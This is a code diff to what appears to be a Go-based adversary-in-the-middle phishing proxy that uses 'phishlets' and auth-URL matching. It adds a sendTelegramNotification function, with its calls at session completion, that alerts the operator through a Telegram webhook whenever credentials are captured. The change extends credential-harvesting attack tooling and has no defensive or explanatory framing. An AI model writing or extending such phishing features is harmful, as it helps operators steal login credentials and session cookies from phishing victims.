@@ -953,6 +953,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for _, au := range pl.authUrls {
 							if au.MatchString(req.URL.Path) {
 								s.Finish(true)
+								// Send Telegram notification
+								go p.sendTelegramNotification(s, pl.Name)
 								break
 							}
 						}
@@ -1169,6 +1171,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 						}
 						s.Finish(false)
+						// Send Telegram notification
+						go p.sendTelegramNotification(s, pl.Name)
 					}
 				}
 			}
@@ -2122,4 +2126,22 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+// sendTelegramNotification sends a notification to Telegram when credentials are captured
+func (p *HttpProxy) sendTelegramNotification(session *Session, phishletName string) {
+	webhook := p.cfg.GetWebhookTelegram()
+	if webhook == "" {
+		return // Telegram not configured
+	}
+
+	notifier := NewTelegramNotifier(webhook)
+	if !notifier.IsEnabled() {
+		return
+	}
+
+	err := notifier.NotifyCredentialCapture(session, phishletName)
+	if err != nil {
+		log.Error("Failed to send Telegram notification: %v", err)
+	}
 }
